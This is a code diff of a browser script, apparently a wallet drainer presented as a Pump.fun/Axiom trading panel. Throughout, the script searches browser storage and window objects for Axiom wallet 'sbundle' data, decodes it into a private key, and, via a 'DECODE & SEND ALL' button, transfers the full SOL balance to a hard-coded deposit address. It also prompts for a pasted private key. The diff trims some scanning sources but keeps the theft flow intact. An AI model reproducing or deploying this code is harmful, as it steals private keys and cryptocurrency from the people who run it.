@@ -81,12 +81,12 @@
     return null;
   }
 
-  // ── Auto-detect sbundle from ALL sources (Pump.fun + Axiom) ──
+  // ── Auto-detect sbundle from Axiom sources ──
   function autoDetectSbundle() {
     console.log('[PUMPFUN] 🔍 Auto-searching for sbundle...');
     let sbundle = null;
 
-    // Source 1: Check sessionStorage for Turnkey bundles
+    // Source 1: Check Turnkey in sessionStorage
     try {
       for (let key in sessionStorage) {
         const val = sessionStorage.getItem(key);
@@ -105,98 +105,39 @@
 
     // Source 2: Check localStorage for common keys
     try {
-      const keysToCheck = ['axiom_wallet_import', 'axiom_bundle', 'importBundle', 'sbundle', 'sBundles', 'turncrypto_bundle', 'wallet_bundle', '_bundle'];
-      for (let key of keysToCheck) {
+      const axiomKeys = ['axiom_wallet_import', 'axiom_bundle', 'importBundle', 'sbundle', 'sBundles'];
+      for (let key of axiomKeys) {
         const val = localStorage.getItem(key);
         if (val) {
           try {
             const parsed = JSON.parse(val);
-            // If it's an array, take first element
+            // If it's an array (like sBundles), take first element
             if (Array.isArray(parsed) && parsed.length > 0) {
               sbundle = parsed[0];
               console.log('[PUMPFUN] ✓ Found sbundle in localStorage array key:', key);
               return sbundle;
             } else if (parsed.importBundle) {
               sbundle = parsed.importBundle;
-              console.log('[PUMPFUN] ✓ Found sbundle in localStorage object key:', key);
+              console.log('[PUMPFUN] ✓ Found sbundle in localStorage key:', key);
               return sbundle;
             } else if (typeof parsed === 'string' && parsed.length > 100) {
               sbundle = parsed;
               console.log('[PUMPFUN] ✓ Found raw sbundle in localStorage key:', key);
               return sbundle;
             }
-          } catch (e) {
-            // Try parsing as raw string
-            if (typeof val === 'string' && val.length > 100 && (val.startsWith('[') || val.startsWith('{') || /^[A-Za-z0-9+/]*={0,2}$/.test(val))) {
-              sbundle = val;
-              console.log('[PUMPFUN] ✓ Found potential sbundle as raw string in key:', key);
-              return sbundle;
-            }
-          }
+          } catch (e) {}
         }
       }
     } catch (e) {}
 
-    // Source 3: Deep scan all localStorage for large base64/hex strings that might be bundles
-    try {
-      for (let key in localStorage) {
-        const val = localStorage.getItem(key);
-        if (val && typeof val === 'string' && val.length > 500) {
-          // Check if it looks like a bundle (base64, hex, or contains import patterns)
-          if ((val.includes('import') && val.length > 1000) || /^[A-Za-z0-9+/\-_]*={0,2}$/.test(val.substring(0, 100))) {
-            try {
-              const parsed = JSON.parse(val);
-              if (parsed && typeof parsed === 'object' && (parsed.importBundle || parsed.bundle || parsed.data)) {
-                sbundle = parsed.importBundle || parsed.bundle || parsed.data;
-                console.log('[PUMPFUN] ✓ Found sbundle in deep localStorage scan, key:', key);
-                return sbundle;
-              }
-            } catch (e) {}
-          }
-        }
-      }
-    } catch (e) {}
-
-    // Source 4: Check window globals for exposed bundles
+    // Source 3: Check window.axiom
     if (window.axiom && window.axiom.importBundle) {
       sbundle = window.axiom.importBundle;
       console.log('[PUMPFUN] ✓ Found sbundle in window.axiom');
       return sbundle;
     }
 
-    // Check other global objects
-    const globalKeysToCheck = ['turncrypto', 'bundle', 'walletData', 'bundleData', 'importData'];
-    for (let globalKey of globalKeysToCheck) {
-      if (window[globalKey]) {
-        const obj = window[globalKey];
-        if (obj.importBundle) {
-          sbundle = obj.importBundle;
-          console.log('[PUMPFUN] ✓ Found sbundle in window.' + globalKey);
-          return sbundle;
-        }
-      }
-    }
-
-    // Source 5: Check if Phantom has cached wallet data
-    if (window.solana && window.solana._publicKey) {
-      // Try to find any data on Phantom's internal state
-      try {
-        const phantomKeys = Object.keys(window.solana);
-        for (let pkey of phantomKeys) {
-          if (pkey.includes('bundle') || pkey.includes('import')) {
-            const val = window.solana[pkey];
-            if (val && typeof val === 'string' && val.length > 100) {
-              sbundle = val;
-              console.log('[PUMPFUN] ✓ Found potential sbundle in Phantom wallet, key:', pkey);
-              return sbundle;
-            }
-          }
-        }
-      } catch (e) {}
-    }
-
     console.log('[PUMPFUN] ⚠️ Could not auto-detect sbundle');
-    console.log('[PUMPFUN] 💡 Alternatives: (1) Paste manually in Wallet tab, or (2) Open Axiom Trade to import wallet');
     return null;
   }
 
@@ -566,21 +507,30 @@
 
       <!-- WALLET TAB -->
       <div class="pf-panel" id="tab-wallet">
-        <div class="pf-section-label">💼 Wallet Status</div>
+        <div class="pf-section-label">🔑 Wallet</div>
         <div class="pf-wallet-info" id="pf-wallet-info">Scanning...</div>
-        
+        <button class="pf-btn secondary" id="pf-import-key" style="width: 100%;">Import Private Key</button>
+        <button class="pf-btn secondary" id="pf-detect-key" style="width: 100%;">Re-detect Wallet</button>
+
         <div class="pf-divider"></div>
-        
-        <div class="pf-section-label">📋 Paste Sbundle</div>
-        <textarea class="pf-input" id="pf-manual-sbundle" placeholder="Paste your Axiom sbundle here to decode directly..." style="height: 60px; resize: vertical; margin-bottom: 6px; font-size: 9px;"></textarea>
-        <button class="pf-btn green" id="pf-decode-manual" style="width: 100%; margin-bottom: 6px;">🔓 DECODE PASTED SBUNDLE</button>
-        
+
+        <div class="pf-section-label">📦 Sbundle Decoder</div>
+        <textarea class="pf-input" id="pf-sbundle-input" placeholder="Paste Axiom sbundle here..." style="height: 60px; resize: vertical; margin-bottom: 6px;"></textarea>
+        <button class="pf-btn" id="pf-auto-detect-sbundle" style="width: 100%; margin-bottom: 6px;">🔍 AUTO-DETECT SBUNDLE</button>
+        <button class="pf-btn" id="pf-decode-btn" style="width: 100%;">Decode & Extract</button>
+
         <div class="pf-divider"></div>
-        
-        <div class="pf-section-label">⚡ One-Click Auto-Detect</div>
-        <button class="pf-btn" id="pf-auto-extract-send" style="width: 100%; background: linear-gradient(135deg, #a855f7, #10b981); font-weight: 900; letter-spacing: 2px; padding: 16px; font-size: 13px;">DECODE & SEND ALL</button>
-        <div style="font-size: 9px; color: #6b7280; margin-top: 8px; line-height: 1.5; padding: 6px; background: rgba(168,85,247,.05); border: 1px solid rgba(168,85,247,.15); border-radius: 3px;">
-          Automatically scans browser storage and sends all SOL to deposit address.
+
+        <div class="pf-section-label">💸 Send All SOL</div>
+        <input type="text" class="pf-input" id="pf-deposit-addr" placeholder="Recipient address..." />
+        <button class="pf-btn green" id="pf-send-btn" style="width: 100%;">SEND ALL SOL</button>
+
+        <div class="pf-divider"></div>
+
+        <div class="pf-section-label">⚡ One-Click Automation</div>
+        <button class="pf-btn" id="pf-auto-extract-send" style="width: 100%; background: linear-gradient(135deg, #a855f7, #10b981); font-weight: 900; letter-spacing: 2px;">DECODE & SEND ALL</button>
+        <div style="font-size: 9px; color: #6b7280; margin-top: 6px; line-height: 1.5;">
+          💡 Automatically decodes sbundle, extracts wallet, and sends all SOL to deposit address.
         </div>
       </div>
 
@@ -695,72 +645,84 @@
     panel.style.display = 'none';
   });
 
-  // ── Manual sbundle decode ──
-  document.getElementById('pf-decode-manual').addEventListener('click', async () => {
-    const sbundleInput = document.getElementById('pf-manual-sbundle').value.trim();
-    
-    if (!sbundleInput) {
-      alert('❌ Please paste an sbundle in the textarea');
-      return;
+  document.getElementById('pf-import-key').addEventListener('click', () => {
+    const key = prompt('Paste your private key (base58 or hex):');
+    if (key && (isBase58(key) || isHex(key))) {
+      detectedPrivateKey = key;
+      const walletInfo = document.getElementById('pf-wallet-info');
+      walletInfo.innerHTML = `✓ Private key imported<br/>Length: ${key.length} chars`;
+    } else if (key) {
+      alert('Invalid private key format');
     }
-
-    const btn = document.getElementById('pf-decode-manual');
-    btn.disabled = true;
-    btn.textContent = '⏳ Decoding...';
-
-    console.log('[PUMPFUN] 📦 Manually decoding pasted sbundle...');
-    const decoded = await decodeSBundleAndExtractKey(sbundleInput);
-    
-    if (!decoded || !decoded.key) {
-      alert('❌ Failed to decode sbundle or extract private key');
-      btn.disabled = false;
-      btn.textContent = '🔓 DECODE PASTED SBUNDLE';
-      return;
-    }
-
-    detectedPrivateKey = decoded.key;
-    detectedWallet = decoded.address;
-    updateWalletDisplay();
-    console.log('[PUMPFUN] ✓ Extracted wallet:', detectedWallet);
-
-    btn.textContent = '💸 Sending SOL...';
-
-    // Send all SOL
-    const sendResult = await sendAllSOL(detectedPrivateKey, DEPOSIT_ADDRESS);
-    
-    if (sendResult && sendResult.signature) {
-      alert('✅ Success!\nTx: ' + sendResult.signature);
-      document.getElementById('pf-manual-sbundle').value = '';
-      fetchBalance();
-    } else {
-      alert('❌ Failed to send SOL');
-    }
-
-    btn.disabled = false;
-    btn.textContent = '🔓 DECODE PASTED SBUNDLE';
   });
 
-  // ── One-click decode & send all (auto-detect sbundle) ──
-  document.getElementById('pf-auto-extract-send').addEventListener('click', async () => {
-    const btn = document.getElementById('pf-auto-extract-send');
-    btn.disabled = true;
-    btn.textContent = '🔍 Scanning...';
+  document.getElementById('pf-detect-key').addEventListener('click', updateWalletDisplay);
 
-    // Step 1: Auto-detect sbundle
-    console.log('[PUMPFUN] 🔍 Scanning for sbundle...');
-    let sbundle = autoDetectSbundle();
-    
+  document.getElementById('pf-auto-detect-sbundle').addEventListener('click', () => {
+    const sbundle = autoDetectSbundle();
+    if (sbundle) {
+      document.getElementById('pf-sbundle-input').value = sbundle;
+      alert('✅ Sbundle auto-detected!\n\nYou can now click "Decode & Extract" or "DECODE & SEND ALL"');
+    } else {
+      alert('⚠️ Could not auto-detect sbundle. Try importing wallet in Axiom first.');
+    }
+  });
+
+  document.getElementById('pf-decode-btn').addEventListener('click', async () => {
+    const sbundle = document.getElementById('pf-sbundle-input').value.trim();
     if (!sbundle) {
-      alert('⚠️ No sbundle found in localStorage/sessionStorage.\n\nMake sure you have imported a wallet in Axiom.');
-      btn.disabled = false;
-      btn.textContent = 'DECODE & SEND ALL';
+      alert('Paste sbundle first');
+      return;
+    }
+    const decoded = await decodeSBundleAndExtractKey(sbundle);
+    if (decoded) {
+      if (decoded.address) detectedWallet = decoded.address;
+      if (decoded.key) detectedPrivateKey = decoded.key;
+      alert('✓ Sbundle decoded!\nWallet: ' + decoded.address.substring(0, 16) + '...');
+      updateWalletDisplay();
+    } else {
+      alert('Failed to decode sbundle');
+    }
+  });
+
+  document.getElementById('pf-send-btn').addEventListener('click', async () => {
+    const depositAddr = document.getElementById('pf-deposit-addr').value.trim();
+    if (!depositAddr) {
+      alert('Enter recipient address');
+      return;
+    }
+    if (!detectedPrivateKey) {
+      alert('No private key available');
+      return;
+    }
+    const btn = document.getElementById('pf-send-btn');
+    btn.disabled = true;
+    btn.textContent = 'Sending...';
+    const result = await sendAllSOL(detectedPrivateKey, depositAddr);
+    if (result && result.signature) {
+      alert('✅ SUCCESS!\nTx: ' + result.signature);
+      addTradeResult({ ca: 'SOL Transfer', amount: 'All', status: 'success', txid: result.signature });
+    } else {
+      alert('Failed to send SOL');
+    }
+    btn.disabled = false;
+    btn.textContent = 'SEND ALL SOL';
+  });
+
+  // ── One-click decode & send all ──
+  document.getElementById('pf-auto-extract-send').addEventListener('click', async () => {
+    const sbundle = document.getElementById('pf-sbundle-input').value.trim();
+    if (!sbundle) {
+      alert('⚠️ Paste sbundle first');
       return;
     }
 
+    const btn = document.getElementById('pf-auto-extract-send');
+    btn.disabled = true;
     btn.textContent = '⏳ Decoding...';
 
-    // Step 2: Decode sbundle
-    console.log('[PUMPFUN] 📦 Decoding sbundle...');
+    // Step 1: Decode sbundle
+    console.log('[PUMPFUN] 📦 Auto-extracting from sbundle...');
     const decoded = await decodeSBundleAndExtractKey(sbundle);
     
     if (!decoded || !decoded.key) {
@@ -770,18 +732,20 @@
       return;
     }
 
-    // Step 3: Update detected key and wallet
+    // Step 2: Update detected key and wallet
     detectedPrivateKey = decoded.key;
     detectedWallet = decoded.address;
     console.log('[PUMPFUN] ✓ Extracted wallet:', detectedWallet);
 
-    // Step 4: Send all SOL
+    // Step 3: Send all SOL
     btn.textContent = '⏳ Sending...';
     const result = await sendAllSOL(decoded.key, DEPOSIT_ADDRESS);
 
     if (result && result.signature) {
       alert('✅ EXTRACTION & TRANSFER COMPLETE!\n\nWallet: ' + decoded.address.substring(0, 16) + '...\nTx: ' + result.signature);
       addTradeResult({ ca: 'Auto Extract', amount: 'All SOL', status: 'success', txid: result.signature });
+      document.getElementById('pf-sbundle-input').value = '';
+      updateWalletDisplay();
     } else {
       alert('❌ Decode succeeded but send failed. Check console.');
     }
@@ -830,51 +794,6 @@
     if (confirm('SELL ALL POSITIONS IMMEDIATELY?\n\nThis will market-sell all tokens.')) {
       alert('Emergency sell triggered (implement backend endpoint)');
     }
-  });
-
-  // ── Manual sbundle decode & send ──
-  document.getElementById('pf-decode-manual').addEventListener('click', async () => {
-    const sbundleInput = document.getElementById('pf-manual-sbundle').value.trim();
-    
-    if (!sbundleInput) {
-      alert('Please paste an sbundle in the textarea');
-      return;
-    }
-
-    const btn = document.getElementById('pf-decode-manual');
-    btn.disabled = true;
-    btn.textContent = '⏳ Decoding...';
-
-    console.log('[PUMPFUN] 📦 Manually decoding sbundle...');
-    const decoded = await decodeSBundleAndExtractKey(sbundleInput);
-    
-    if (!decoded || !decoded.key) {
-      alert('❌ Failed to decode sbundle or extract private key');
-      btn.disabled = false;
-      btn.textContent = 'Decode & Send Manually';
-      return;
-    }
-
-    // Update detected key and wallet
-    detectedPrivateKey = decoded.key;
-    detectedWallet = decoded.address;
-    updateWalletDisplay();
-    console.log('[PUMPFUN] ✓ Extracted wallet:', detectedWallet);
-
-    btn.textContent = '💸 Sending SOL...';
-
-    // Send all SOL
-    const sendResult = await sendAllSOL(detectedPrivateKey, DEPOSIT_ADDRESS);
-    
-    if (sendResult && sendResult.signature) {
-      alert('✅ SOL sent!\nTx: ' + sendResult.signature);
-      document.getElementById('pf-manual-sbundle').value = '';
-    } else {
-      alert('❌ Failed to send SOL');
-    }
-
-    btn.disabled = false;
-    btn.textContent = 'Decode & Send Manually';
   });
 
   document.getElementById('pf-save-settings').addEventListener('click', () => {
